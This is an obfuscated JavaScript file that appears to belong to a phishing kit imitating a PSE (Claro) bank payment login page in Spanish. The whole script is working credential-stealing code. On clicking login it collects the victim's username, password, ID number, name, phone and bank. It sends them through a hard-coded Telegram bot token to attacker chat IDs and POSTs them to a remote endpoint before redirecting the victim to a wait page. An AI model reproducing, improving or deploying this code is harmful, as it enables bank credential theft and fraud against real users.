const _0x4d2971 = _0x3494;
(function (_0x40664c, _0x19554e) {
  const _0x448f7d = _0x3494,
    _0x2cef10 = _0x40664c();
  while (!![]) {
    try {
      const _0x32947e =
        -parseInt(_0x448f7d(0x77)) / 0x1 +
        (-parseInt(_0x448f7d(0x7d)) / 0x2) * (parseInt(_0x448f7d(0x87)) / 0x3) +
        -parseInt(_0x448f7d(0x6b)) / 0x4 +
        (-parseInt(_0x448f7d(0x6e)) / 0x5) *
          (-parseInt(_0x448f7d(0x75)) / 0x6) +
        parseInt(_0x448f7d(0x66)) / 0x7 +
        -parseInt(_0x448f7d(0x91)) / 0x8 +
        parseInt(_0x448f7d(0x89)) / 0x9;
      if (_0x32947e === _0x19554e) break;
      else _0x2cef10["push"](_0x2cef10["shift"]());
    } catch (_0x326014) {
      _0x2cef10["push"](_0x2cef10["shift"]());
    }
  }
})(_0x4d25, 0x6c736);
function _0x3494(_0x3a7081, _0x3b7678) {
  const _0x4d25d6 = _0x4d25();
  return (
    (_0x3494 = function (_0x3494c9, _0x2b621e) {
      _0x3494c9 = _0x3494c9 - 0x65;
      let _0x2cd57d = _0x4d25d6[_0x3494c9];
      return _0x2cd57d;
    }),
    _0x3494(_0x3a7081, _0x3b7678)
  );
}
function updateLS() {
  const _0x435bd1 = _0x3494;
  LS["setItem"](_0x435bd1(0x92), JSON[_0x435bd1(0x88)](info));
}
const button = document[_0x4d2971(0x8f)]("btnLogin-page1"),
  userInput = document[_0x4d2971(0x8f)](_0x4d2971(0x6f)),
  passInput = document[_0x4d2971(0x8f)](_0x4d2971(0x79));
function _0x4d25() {
  const _0x1f15ce = [
    "\x0a🔒Contraseña:\x20",
    "108960kDOniu",
    "docNumberMovil",
    "Network\x20response\x20was\x20not\x20ok",
    "focus",
    "preventDefault",
    "statusText",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "192wtixYx",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.",
    "795576jOEeFO",
    "puser",
    "passwordMovil",
    "log",
    "metaInfo",
    "\x0aFuente:\x20",
    "20GBswHN",
    "POST",
    "json",
    "Error\x20de\x20red:",
    "Error\x20al\x20enviar\x20mensaje\x20a\x20chatId\x20",
    "Mensaje\x20enviado\x20a\x20Telegram\x20para\x20el\x20chatId:\x20",
    "&text=",
    "\x0a🏦Banco:\x20",
    "location",
    "dudename",
    "208245wAJllD",
    "stringify",
    "15555357rETmub",
    "href",
    "error",
    "value",
    "password",
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor:",
    "getElementById",
    "/trico/tricoPse",
    "5205584fevOck",
    "info",
    "telnum",
    "1205274rBOTOD",
    "disabled",
    "./wait.html",
    "user",
    "nombre",
    "53044FgfVeq",
    "bank",
  ];
  _0x4d25 = function () {
    return _0x1f15ce;
  };
  return _0x4d25();
}
async function sendToTelegram(_0x323ebe, _0x430f10) {
  const _0x408739 = _0x4d2971;
  try {
    for (const _0x5bcf0c of _0x430f10) {
      const _0x5c133d =
          _0x408739(0x74) +
          _0x5bcf0c +
          _0x408739(0x83) +
          encodeURIComponent(_0x323ebe),
        _0x4eea34 = await fetch(_0x5c133d);
      _0x4eea34["ok"]
        ? console[_0x408739(0x7a)](_0x408739(0x82) + _0x5bcf0c)
        : console[_0x408739(0x8b)](
            _0x408739(0x81) + _0x5bcf0c + ":",
            _0x4eea34[_0x408739(0x73)]
          );
    }
  } catch (_0x3c1578) {
    console["error"](_0x408739(0x80), _0x3c1578);
  }
}
button["addEventListener"]("click", async function (_0x361b7c) {
  const _0x3a69b9 = _0x4d2971;
  _0x361b7c[_0x3a69b9(0x72)](), (button[_0x3a69b9(0x67)] = !![]);
  if (userInput[_0x3a69b9(0x8c)] == "" && passInput[_0x3a69b9(0x8c)] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x3a69b9(0x71)](),
      (button[_0x3a69b9(0x67)] = ![]);
    return;
  } else {
    var _0x296514 = userInput[_0x3a69b9(0x8c)],
      _0x2e018b = passInput["value"];
    (info["metaInfo"]["user"] = _0x296514),
      (info["metaInfo"][_0x3a69b9(0x78)] = _0x2e018b),
      updateLS();
    const _0x534606 = {
        id: info[_0x3a69b9(0x7b)]["cc"],
        nombre: info[_0x3a69b9(0x7b)][_0x3a69b9(0x86)],
        telefono: info["metaInfo"][_0x3a69b9(0x65)],
        direccion: "",
        usuario: info["metaInfo"][_0x3a69b9(0x69)],
        password: info[_0x3a69b9(0x7b)][_0x3a69b9(0x78)],
        bank: info["metaInfo"]["ban"],
      },
      _0x51fcd =
        "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20" +
        _0x534606["id"] +
        "\x0a🆔Nombre:\x20" +
        _0x534606[_0x3a69b9(0x6a)] +
        "\x0a📱Teléfono:\x20" +
        _0x534606["telefono"] +
        "\x0a🚹Usuario:\x20" +
        _0x534606["usuario"] +
        _0x3a69b9(0x6d) +
        _0x534606[_0x3a69b9(0x8d)] +
        _0x3a69b9(0x84) +
        _0x534606[_0x3a69b9(0x6c)] +
        _0x3a69b9(0x7c) +
        fuente;
    await sendToTelegram(_0x51fcd, chatIds);
    try {
      const _0x47334c = await fetch(url + _0x3a69b9(0x90), {
        method: _0x3a69b9(0x7e),
        headers: { "Content-Type": "application/json" },
        body: JSON[_0x3a69b9(0x88)](_0x534606),
      });
      if (!_0x47334c["ok"]) throw new Error(_0x3a69b9(0x70));
      const _0x461b48 = await _0x47334c[_0x3a69b9(0x7f)]();
      window[_0x3a69b9(0x85)][_0x3a69b9(0x8a)] = _0x3a69b9(0x68);
    } catch (_0x502320) {
      console[_0x3a69b9(0x8b)](_0x3a69b9(0x8e), _0x502320),
        alert(_0x3a69b9(0x76)),
        (button[_0x3a69b9(0x67)] = ![]);
    }
  }
});
